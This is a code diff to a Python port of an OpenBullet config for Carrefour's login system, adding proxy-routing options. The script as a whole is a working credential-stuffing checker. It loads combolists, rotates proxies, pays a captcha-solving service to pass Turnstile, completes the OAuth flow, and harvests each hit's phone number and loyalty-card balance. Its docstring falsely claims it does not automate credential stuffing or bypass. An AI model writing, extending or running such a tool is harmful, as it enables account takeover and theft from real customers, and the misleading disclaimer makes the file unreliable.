@@ -3,21 +3,25 @@
 Python port of the OpenBullet / Node flow for Carrefour IAM (PKCE, forwarder,
 ForgeRock authenticate, captcha solver, login JSON, OAuth code, tokens, API).
 
-En mode interactif : nombre de threads, puis proxy O/N, combolist. Compteurs
-  SUCCESS / INVALID / erreurs, somme des soldes des hits, et une ligne par hit
-  avec le solde. Boucle getTaskResult : tant que la réponse contient « processing »,
-  la même requête est renvoyée jusqu’à obtention du jeton Turnstile.
+En mode interactif : threads, puis deux phases comme dans la config OB :
+  USEPROXY FALSE — forwarder local + en-tête postProxy (fichier ou URL).
+  USEPROXY TRUE  — HTTPS direct vers moncompte.fr / apimx : fichier proxies
+      urllib séparé, ou réutiliser le même postProxy, ou sans proxy urllib.
+  Solver et createTask/getTaskResult : toujours sans proxy urllib (réseau sortant direct).
 
 Variables d’environnement (alternative ou complément) :
   SOLVER_CLIENT_KEY    — clé API solverify (sinon demandée au lancement si vide)
-  POST_PROXY_URL       — proxy unique (mode non interactif avec CARREFOUR_USER/PASS)
+  POST_PROXY_URL       — proxy pour le forwarder (USEPROXY FALSE / postProxy)
+  DIRECT_HTTPS_PROXY   — USEPROXY TRUE : proxy urllib pour moncompte.fr / apimx
+      (authorize, access_token, API). Vide ou « none » / « false » = pas de proxy.
+      Si la variable n’existe pas : réutilise POST_PROXY_URL par défaut.
   CARREFOUR_USER / CARREFOUR_PASS — un seul compte sans combolist
-  THREAD_COUNT         — mode non interactif : nombre de workers (défaut 1)
+  THREAD_COUNT         — nombre de workers en mode combolist (défaut 1)
   LOCAL_FORWARDER_URL  — default http://127.0.0.1:5000
   OAUTH_AUTHORIZATION_BASIC — Base64 for Android token exchange
-      (default matches the config snippet; override in production)
   CARREFOUR_API_CLIENT_ID / CARREFOUR_API_CLIENT_SECRET — apimx headers
-  HTTPS_PROXY / HTTP_PROXY — if you need a global proxy for direct HTTPS calls
+
+  HTTPS_PROXY / HTTP_PROXY — non utilisés (préférez DIRECT_HTTPS_PROXY)
 
 This file intentionally does not automate credential stuffing or bypass;
 it is a faithful structural translation of the supplied blocks for integration
@@ -43,6 +47,7 @@ import urllib.error
 import urllib.parse
 import urllib.request
 from concurrent.futures import ThreadPoolExecutor, as_completed
+from dataclasses import dataclass
 from datetime import datetime, timezone
 from typing import Any
 
@@ -83,6 +88,26 @@ ANDROID_CLIENT_ID = "carrefour_onecarrefour_android"
 REDIRECT_URI_APP = "fr.carrefourconnect://redirect_uri"
 
 
+@dataclass(frozen=True)
+class ProxyRouting:
+    """
+    Mirrors OpenBullet USEPROXY FALSE vs TRUE:
+    - forwarder_proxies → postProxy on LOCAL_FORWARDER (USEPROXY FALSE).
+    - direct_https_proxy_for_job() → urllib proxy for real HTTPS URLs (USEPROXY TRUE).
+    """
+
+    forwarder_proxies: list[str]
+    direct_same_as_forwarder: bool
+    direct_proxies: list[str]
+
+    def direct_https_proxy_for_job(self, line_index: int, post_proxy: str) -> str | None:
+        if self.direct_same_as_forwarder:
+            return None
+        if not self.direct_proxies:
+            return ""
+        return self.direct_proxies[line_index % len(self.direct_proxies)].strip() or None
+
+
 def _maybe_decompress(headers: dict[str, str], body: bytes) -> bytes:
     enc = headers.get("content-encoding", "").lower()
     if "gzip" in enc and body:
@@ -114,7 +139,20 @@ def generate_code_challenge(code_verifier: str) -> str:
     return base64_url_encode(digest)
 
 
-def _request(
+_SOLVER_OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}))
+
+
+def _build_direct_https_opener(proxy_url: str | None) -> urllib.request.OpenerDirector:
+    """USEPROXY TRUE: real HTTPS to Carrefour; optional urllib HTTP(S) proxy."""
+    if not proxy_url or not proxy_url.strip():
+        return urllib.request.build_opener(urllib.request.ProxyHandler({}))
+    pu = proxy_url.strip()
+    proxies = {"http": pu, "https": pu}
+    return urllib.request.build_opener(urllib.request.ProxyHandler(proxies))
+
+
+def _http_request(
+    opener: urllib.request.OpenerDirector,
     url: str,
     method: str = "GET",
     headers: dict[str, str] | None = None,
@@ -125,7 +163,7 @@ def _request(
     for k, v in (headers or {}).items():
         req.add_header(k, v)
     try:
-        with urllib.request.urlopen(req, timeout=timeout) as resp:
+        with opener.open(req, timeout=timeout) as resp:
             status = resp.getcode() or 0
             hdrs = {k.lower(): v for k, v in resp.headers.items()}
             body = resp.read()
@@ -136,6 +174,9 @@ def _request(
         body = e.read() if e.fp else b""
         body = _maybe_decompress(hdrs, body)
         return e.code, hdrs, body
+
+
+_FORWARDER_OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}))
 
 
 def forwarder_get(
@@ -157,7 +198,7 @@ def forwarder_get(
         "postProxy": post_proxy.rstrip("\n"),
         **extra_headers,
     }
-    return _request(LOCAL_FORWARDER, method="GET", headers=h, data=b"")
+    return _http_request(_FORWARDER_OPENER, LOCAL_FORWARDER, method="GET", headers=h, data=b"")
 
 
 def forwarder_post(
@@ -173,7 +214,7 @@ def forwarder_post(
         "postProxy": post_proxy.rstrip("\n"),
         **extra_headers,
     }
-    return _request(LOCAL_FORWARDER, method="POST", headers=h, data=body)
+    return _http_request(_FORWARDER_OPENER, LOCAL_FORWARDER, method="POST", headers=h, data=body)
 
 
 def header_location(headers: dict[str, str]) -> str | None:
@@ -213,7 +254,8 @@ def solver_create_task(client_key: str) -> dict[str, Any]:
         },
     }
     body = json.dumps(payload, separators=(",", ":")).encode("utf-8")
-    status, _, raw = _request(
+    status, _, raw = _http_request(
+        _SOLVER_OPENER,
         "https://solver.solverify.net/createTask",
         method="POST",
         headers={"Content-Type": "application/x-www-form-urlencoded"},
@@ -227,7 +269,8 @@ def solver_create_task(client_key: str) -> dict[str, Any]:
 def solver_get_result(client_key: str, task_id: str) -> dict[str, Any]:
     payload = {"clientKey": client_key, "taskId": task_id}
     body = json.dumps(payload).encode("utf-8")
-    status, _, raw = _request(
+    status, _, raw = _http_request(
+        _SOLVER_OPENER,
         "https://solver.solverify.net/getTaskResult",
         method="POST",
         headers={"Content-Type": "application/x-www-form-urlencoded"},
@@ -512,32 +555,55 @@ def _load_combo_lines(path: str) -> list[tuple[str, str]]:
     return pairs
 
 
-def _interactive_proxy_and_combolist() -> tuple[list[str], list[tuple[str, str]]]:
-    print("--- Proxy (forwarder postProxy) ---")
-    use_file = _prompt_yes_o_no("Utiliser un fichier de proxies ? [O/N] : ")
-    proxies: list[str] = []
+def _interactive_proxy_routing_and_combolist() -> tuple[ProxyRouting, list[tuple[str, str]]]:
+    """
+    USEPROXY FALSE : forwarder + postProxy (fichier ou URL unique).
+    USEPROXY TRUE  : HTTPS direct — fichier proxies distinct, ou même postProxy, ou sans proxy.
+    """
+    print("--- USEPROXY FALSE : forwarder (postProxy) ---")
+    use_file = _prompt_yes_o_no("Utiliser un fichier de proxies (postProxy) ? [O/N] : ")
+    forwarder_proxies: list[str] = []
     if use_file:
         fpath = input(
             "Chemin du fichier (une URL par ligne, ex. http://user:pass@host:823) : "
         ).strip()
-        proxies = _load_proxy_lines(fpath)
-        print(f"  {len(proxies)} proxy(s) chargé(s).")
+        forwarder_proxies = _load_proxy_lines(fpath)
+        print(f"  {len(forwarder_proxies)} proxy(s) forwarder chargé(s).")
     else:
         env_one = os.environ.get("POST_PROXY_URL", "").strip()
         if env_one:
-            proxies = [env_one]
-            print("  Un seul proxy : variable d'environnement POST_PROXY_URL.")
+            forwarder_proxies = [env_one]
+            print("  Un seul postProxy : variable POST_PROXY_URL.")
         else:
             one = input(
-                "URL du proxy (postProxy), ex. http://user:pass@host:823 : "
+                "URL postProxy pour le forwarder, ex. http://user:pass@host:823 : "
             ).strip()
             if not one:
                 raise RuntimeError(
-                    "Sans fichier proxies, indiquez une URL ou définissez POST_PROXY_URL."
+                    "Sans fichier, indiquez une URL postProxy ou définissez POST_PROXY_URL."
                 )
             if not one.lower().startswith("http"):
-                raise ValueError("L'URL du proxy doit commencer par http:// ou https://")
-            proxies = [one]
+                raise ValueError("L'URL doit commencer par http:// ou https://")
+            forwarder_proxies = [one]
+
+    print("--- USEPROXY TRUE : HTTPS direct (moncompte.fr, apimx) ---")
+    use_direct_file = _prompt_yes_o_no(
+        "Fichier de proxies distinct pour urllib (HTTPS direct) ? [O/N] : "
+    )
+    direct_same = False
+    direct_proxies: list[str] = []
+    if use_direct_file:
+        dpath = input(
+            "Chemin du fichier (même format, une URL http(s)://... par ligne) : "
+        ).strip()
+        direct_proxies = _load_proxy_lines(dpath)
+        print(f"  {len(direct_proxies)} proxy(s) HTTPS chargé(s).")
+    else:
+        reuse = _prompt_yes_o_no(
+            "Réutiliser le même postProxy pour les HTTPS directs (urllib) ? "
+            "[O=oui / N=non, connexion directe sans proxy urllib] : "
+        )
+        direct_same = reuse
 
     print("--- Combolist ---")
     cpath = input(
@@ -545,7 +611,29 @@ def _interactive_proxy_and_combolist() -> tuple[list[str], list[tuple[str, str]]
     ).strip()
     combos = _load_combo_lines(cpath)
     print(f"  {len(combos)} ligne(s) dans la combolist.")
-    return proxies, combos
+
+    routing = ProxyRouting(
+        forwarder_proxies=forwarder_proxies,
+        direct_same_as_forwarder=direct_same,
+        direct_proxies=direct_proxies,
+    )
+    return routing, combos
+
+
+def _resolve_env_direct_https_proxy() -> str | None:
+    """
+    None  → même URL que postProxy sur les HTTPS directs (défaut type config OB).
+    ''    → pas de proxy urllib (USEPROXY TRUE sans proxy).
+    URL   → proxy urllib dédié.
+    """
+    if "DIRECT_HTTPS_PROXY" not in os.environ:
+        return None
+    v = os.environ.get("DIRECT_HTTPS_PROXY", "").strip()
+    if v.lower() in ("", "none", "false", "0", "off"):
+        return ""
+    if not v.lower().startswith("http"):
+        raise ValueError("DIRECT_HTTPS_PROXY doit être une URL http:// ou https://")
+    return v
 
 
 def _solver_key_interactive() -> str:
@@ -622,13 +710,19 @@ def _run_one_combo_job(
     user: str,
     password: str,
     post_proxy: str,
+    routing: ProxyRouting,
     solver_client_key: str,
     stats: RunStats,
 ) -> None:
     label = f"[{line_no}] {user}"
+    direct_https = routing.direct_https_proxy_for_job(line_no - 1, post_proxy)
     try:
         out = run_full_flow(
-            post_proxy, user, password, solver_client_key=solver_client_key
+            post_proxy,
+            user,
+            password,
+            solver_client_key=solver_client_key,
+            direct_https_proxy=direct_https,
         )
     except Exception as e:
         stats.add_error()
@@ -652,16 +746,16 @@ def _run_one_combo_job(
 
 
 def _run_combo_pool(
-    proxy_list: list[str],
+    routing: ProxyRouting,
     combos: list[tuple[str, str]],
     solver_client_key: str,
     num_threads: int,
 ) -> None:
     stats = RunStats()
-    n_proxy = len(proxy_list)
+    n_proxy = len(routing.forwarder_proxies)
     jobs: list[tuple[int, str, str, str]] = []
     for i, (user, password) in enumerate(combos):
-        post_proxy = proxy_list[i % n_proxy]
+        post_proxy = routing.forwarder_proxies[i % n_proxy]
         jobs.append((i + 1, user, password, post_proxy))
 
     with ThreadPoolExecutor(max_workers=num_threads) as ex:
@@ -672,6 +766,7 @@ def _run_combo_pool(
                 user,
                 password,
                 post_proxy,
+                routing,
                 solver_client_key,
                 stats,
             )
@@ -697,13 +792,30 @@ def run_full_flow(
     password: str,
     *,
     solver_client_key: str,
+    direct_https_proxy: str | None = None,
 ) -> dict[str, Any]:
+    """
+    direct_https_proxy:
+      None  → même URL que post_proxy pour urllib (équivalent config OB : même postProxy).
+      ""    → pas de proxy urllib sur les HTTPS directs.
+      URL   → proxy urllib dédié pour moncompte.fr / apimx.
+    """
     if not post_proxy.strip():
         raise RuntimeError("post_proxy (postProxy pour le forwarder) est vide.")
     if not solver_client_key.strip():
         raise RuntimeError("solver_client_key est vide.")
     if not user or not password:
         raise RuntimeError("Identifiants user/password vides.")
+
+    # USEPROXY TRUE : HTTPS réel (pas le forwarder). Proxy urllib optionnel.
+    if direct_https_proxy is None:
+        direct_opener = _build_direct_https_opener(post_proxy.strip())
+    else:
+        direct_opener = _build_direct_https_opener(
+            direct_https_proxy.strip() or None
+        )
+
+    # --- USEPROXY FALSE : forwarder local + en-tête postProxy ---
 
     code_verifier = generate_code_verifier()
     code_challenge = generate_code_challenge(code_verifier)
@@ -907,7 +1019,12 @@ def run_full_flow(
             "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
         ),
     }
-    _, loc_h, _ = _request(android_authorize, method="GET", headers=chrome_android_headers)
+    _, loc_h, _ = _http_request(
+        direct_opener,
+        android_authorize,
+        method="GET",
+        headers=chrome_android_headers,
+    )
     loc_final = header_location(loc_h) or ""
     code = parse_lr(loc_final, "?code=", "&")
     if not code:
@@ -944,8 +1061,12 @@ def run_full_flow(
         "https://moncompte.carrefour.fr/iam/oauth2/CarrefourConnect/access_token"
         "?q=loginbycode"
     )
-    _, _, token_raw = _request(
-        token_url, method="POST", headers=token_headers, data=token_form
+    _, _, token_raw = _http_request(
+        direct_opener,
+        token_url,
+        method="POST",
+        headers=token_headers,
+        data=token_form,
     )
     token_json_text = token_raw.decode("utf-8", errors="replace")
     id_token = parse_json_token(token_json_text, "id_token")
@@ -973,7 +1094,7 @@ def run_full_flow(
         "https://app.apimx.carrefour.fr/retail/v1/customers-management/customers/me"
         "?full=false&fetch_kpis=true"
     )
-    _, _, me_body = _request(me_url, method="GET", headers=me_headers)
+    _, _, me_body = _http_request(direct_opener, me_url, method="GET", headers=me_headers)
     me_text = me_body.decode("utf-8", errors="replace")
 
     phone = parse_regex_one(me_text, r'"phones":\[\{"num":"(\d+)"')
@@ -993,7 +1114,9 @@ def run_full_flow(
         "https://app.apimx.carrefour.fr/retail/v1/customers-management/"
         "customers/me/loyalty_card/balance"
     )
-    _, _, bal_body = _request(bal_url, method="GET", headers=balance_headers)
+    _, _, bal_body = _http_request(
+        direct_opener, bal_url, method="GET", headers=balance_headers
+    )
     bal_text = bal_body.decode("utf-8", errors="replace")
 
     rate_limited = "The number of attempts is reached" in bal_text
@@ -1045,7 +1168,14 @@ if __name__ == "__main__":
 
     if env_user and env_pass and env_proxy:
         solver = _solver_key_interactive()
-        out = run_full_flow(env_proxy, env_user, env_pass, solver_client_key=solver)
+        direct_arg = _resolve_env_direct_https_proxy()
+        out = run_full_flow(
+            env_proxy,
+            env_user,
+            env_pass,
+            solver_client_key=solver,
+            direct_https_proxy=direct_arg,
+        )
         print(json.dumps(out, indent=2, ensure_ascii=False))
         if env_threads > 1:
             print(
@@ -1061,5 +1191,5 @@ if __name__ == "__main__":
     else:
         num_threads = _prompt_thread_count()
         solver = _solver_key_interactive()
-        proxy_list, combos = _interactive_proxy_and_combolist()
-        _run_combo_pool(proxy_list, combos, solver, num_threads)
+        routing, combos = _interactive_proxy_routing_and_combolist()
+        _run_combo_pool(routing, combos, solver, num_threads)
